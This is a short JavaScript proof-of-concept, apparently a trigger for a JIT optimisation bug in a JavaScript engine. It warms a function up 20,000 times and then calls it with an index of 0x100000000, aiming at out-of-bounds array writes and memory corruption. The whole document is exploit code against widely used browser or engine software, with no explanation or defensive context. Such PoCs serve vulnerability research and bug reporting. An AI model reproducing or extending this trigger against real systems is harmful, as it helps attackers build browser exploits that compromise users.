function poc(arr1, arr2, trigger) {
    let index = 0;

    if (trigger) {
        index = 0x100000000;
    }

    for (let i = 0; i < 1; i++) {
        const safe_index = index & 0xFFFFFFFF;
        arr1[safe_index] = 3.3;
    }

    arr2[index] = 4.4;
}

for (let i = 0; i < 20000; i++) {
    poc([1.1], [2.2], false);
}

poc([1.1], [2.2], true);